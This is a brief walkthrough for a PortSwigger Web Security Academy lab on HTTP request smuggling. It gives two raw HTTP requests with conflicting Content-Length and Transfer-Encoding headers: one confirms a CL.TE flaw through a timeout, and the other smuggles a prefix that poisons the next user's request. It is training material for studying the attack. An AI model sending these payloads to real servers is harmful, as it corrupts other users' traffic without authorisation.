## [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

- Send the following request. If you get a timeout error the server is vulnerable to CL.TE attack.

```http
POST / HTTP/1.1
Host: 0a68002c030874838144ac2e00aa008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```

- Send the following request to poison the http request:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```


